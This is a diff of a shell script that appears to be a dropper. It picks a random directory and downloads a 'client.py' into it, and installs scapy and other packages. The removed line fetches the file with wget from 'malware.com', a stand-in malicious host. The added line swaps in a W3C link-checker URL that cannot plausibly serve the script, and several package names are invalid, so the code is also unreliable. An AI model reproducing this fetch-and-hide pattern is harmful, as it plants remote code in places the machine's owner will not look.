@@ -13,16 +13,12 @@ random_index=$(( RANDOM % ${#directories[@]} ))
 random_directory=${directories[$random_index]}
 
 # download binary to directory
-wget -P "$random_directory" 'http://www.malware.com/client.py'
+wget -P "$random_directory" 'https://validator.w3.org/checklink?uri=/client.py'
 
 # install any dependencies
-pip3 install scapy.all
-pip3 install scapy
-pip3 install urlib3
-pip3 install urlib
-pip3 install subprocess
-pip3 install beautifulsoup4
-pip3 install bs4
+apt-get install python3-scapy
+apt-get install python3-urllib3
+apt-get install python3-bs4
 #pip3 intsall ...
 
 # if download was successful...
